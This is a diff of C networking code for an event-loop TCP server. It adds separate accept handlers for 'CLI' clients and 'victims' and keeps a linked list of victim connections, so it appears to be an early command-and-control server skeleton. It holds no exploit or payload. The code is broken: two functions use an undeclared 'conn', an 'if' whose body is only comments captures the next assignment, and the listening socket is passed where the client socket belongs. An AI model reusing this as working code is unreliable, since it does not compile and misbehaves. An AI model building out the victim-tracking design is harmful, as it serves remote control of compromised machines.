@@ -6,6 +6,7 @@
 #include <unistd.h>
 
 #include "netwerking.h"
+#include "server.h"
 
 #define UNUSED(X) (void)(X);
 
@@ -33,7 +34,7 @@ int initTcpServer(int port){
         return fd;
 }
 
-void handleAcceptTcp(struct eventLoop *event_loop, int fd, int mask){
+void handleCliAccept(struct eventLoop *event_loop, int fd, int mask){
         UNUSED(event_loop);
         UNUSED(mask);
         
@@ -41,11 +42,62 @@ void handleAcceptTcp(struct eventLoop *event_loop, int fd, int mask){
         socklen_t address_len = sizeof(address);
 
         int conn = netAccept(fd, (struct sockaddr*)&address, &address_len);
-        netNonBlock(NULL, conn);
-        
-        printf("New client connection.\n");
+        netNonBlock(NULL, conn); 
+        printf("New CLI Client connected\n");
 
-        // TODO: Create the connected client here, and add it to the epoll fd loop
+        connCreateConnection(event_loop, conn, EVENT_READ);
+}
+
+void handleVictimAccept(struct eventLoop *event_loop, int fd, int mask){
+        UNUSED(event_loop);
+        UNUSED(mask);
+        
+        struct sockaddr_in address;  
+        socklen_t address_len = sizeof(address);
+
+        int client_fd = netAccept(fd, (struct sockaddr*)&address, &address_len);
+        netNonBlock(NULL, conn); 
+        printf("New Victim connected\n");
+
+        // struct connection *conn = connCreateConnection(client_fd);
+        connCreateConnection(event_loop, client_fd, EVENT_READ);
+        // Create the connection with the conn file descriptor. Creates a conn
+        // struct, which includes the different connection read and write
+        // function pointer callbacks.
+        
+        // createClient() here. In this, connection gets added to the
+        // event_loop fd. Adds the conn->fd via epoll_eventctl, with callback
+        // funcs to connection->ae_handler? If not ae_handler, then read/write
+        // handlers. Also gets added to the linked list of victims.
+        //struct client *victim = createClient(conn);
+        struct client *victim = createClient(fd);
+}
+
+/* === Client Handler and Functions  ===  */
+//struct client *createClient(connection *conn){
+struct client *createClient(int fd){
+        struct client *c = malloc(sizeof(struct client));
+        if (c == NULL) return NULL;
+
+        if (conn)
+                // set connection to nonblocking
+                // connNonBlock();
+                //
+                // call addEpollEvent, and set the callback function to the "Read Data From Clients" function
+                // connSetReadHandler(conn);
+
+        //c->fd = conn->fd;
+        c->fd = fd;
+
+        // Add the new client to the linked list
+        if (conn) linkList(server.victims, c);
+
+        return c;
+}
+
+void linkList(struct list *list, struct client *c){
+        addNodeToList(list, c);
+        c->client_list_node = listLast(list);
 }
 
 /* === Linux sys/socket Functions === */
@@ -68,6 +120,9 @@ int netSetBlock(char *err, int fd, int non_block){
 
         // 0 = Blocking : 1 = Nonblocking  
         getFlags = fcntl(fd, F_GETFL);
+        if (getFlags == -1)
+                perror("getFlags");
+        
         if (non_block)
                 getFlags |= O_NONBLOCK;
 
@@ -98,20 +153,25 @@ int netAccept(int s, struct sockaddr *sa, socklen_t *len){
         return client;
 }
 
-void netRead(int fd){
+int netRead(int fd){
         char buff[1024];
         
-        if (read(fd, buff, 1024) < 0)
-                perror("recv");
+        bzero(buff, sizeof(buff));
+
+        int bytes = read(fd, buff, 1024);
         
         printf("Received: %s\n", buff);
+        
+        return bytes;
 }
 
 void netWrite(int fd){
-        char *motd = "From Server: MOTD";
+        char *motd = "From Server: MOTD\n";
         
         if (write(fd, motd, strlen(motd)) < 0)
                 perror("write");
 }
 
-/* === Handle Connecting Clients ===  */
+int netClose(int fd){
+        return close(fd);    
+}
